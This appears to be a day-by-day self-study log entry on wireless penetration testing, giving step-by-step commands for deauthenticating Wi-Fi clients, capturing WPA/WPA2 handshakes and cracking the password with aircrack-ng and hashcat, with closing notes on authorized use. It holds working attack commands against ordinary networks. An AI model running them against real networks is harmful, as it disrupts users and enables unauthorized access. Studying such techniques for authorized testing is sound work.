# 🔖 Day 8: Wi-Fi Deauthentication & WPA/WPA2 Password Cracking

**🗓️ Date:** June 26, 2025

---

### 🧠 Topics Covered:

* Capturing WPA/WPA2 handshakes
* Wi-Fi deauthentication attacks
* Password cracking using Aircrack-ng and Hashcat
* Monitor mode configuration
* Ethical considerations for wireless testing

---

### 💻 What I Did:

Today, I performed a **Wi-Fi deauthentication attack** followed by an attempt to crack the **WPA/WPA2 password**. The goal was to force users to reconnect so that a **handshake** could be captured, then use a **dictionary or brute-force** attack to crack the password using tools like `aircrack-ng` and `hashcat`.

---

### ⚖️ Prerequisites:

* A Linux system (Kali or Arch-based)
* Tools installed:

  * `aircrack-ng`, `airodump-ng`, `aireplay-ng`, `airmon-ng`
  * `hashcat` (optional)
* Wireless card supporting monitor mode and packet injection

---

### ✅ Steps Followed:

#### 1. **Set Up Wireless Card in Monitor Mode**

```bash
iwconfig              # Identify wireless interface (e.g., wlan0)
sudo airmon-ng start wlan0  # Enable monitor mode (renamed to wlan0mon)
sudo airmon-ng check kill   # Stop conflicting processes
```

#### 2. **Scan for Target Networks**

```bash
sudo airodump-ng wlan0mon  # Shows nearby networks
```

Note down the **BSSID** and **channel** of the target.

#### 3. **Capture WPA/WPA2 Handshake**

```bash
sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w capture wlan0mon
```

This saves the capture file (e.g., `capture-01.cap`).

#### 4. **Deauthenticate Clients**

```bash
sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon  # Broadcast deauth
sudo aireplay-ng --deauth 10 -a [BSSID] -c [Client MAC] wlan0mon  # Specific client
```

Look for "WPA handshake" at the top of the airodump-ng screen.

#### 5. **Crack the Password**

* **Dictionary Attack:**

```bash
sudo aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap
```

* **Brute-Force with Hashcat (Optional):**

```bash
aircrack-ng capture-01.cap -J capture  # Convert to hashcat format
hashcat -m 2500 capture.hccapx wordlist.txt
```

---

### 🧠 Key Learnings:

* **Deauthentication attacks** help capture WPA handshakes.
* **Monitor mode** is essential for wireless packet sniffing.
* Tools like **aircrack-ng** and **hashcat** are effective for password recovery.
* Password cracking success depends heavily on the **quality of the wordlist**.
* These methods are legal **only on authorized networks** and for educational or testing purposes.

---

### ⚠️ Important Notes:

* Always use these techniques **ethically and legally**.
* Tools like `rockyou.txt` or hybrid/custom wordlists can increase chances of success.

---

[⬅️ Back to Day 7](Day7.md) | [➡️ Go to Day 9](Day9.md)
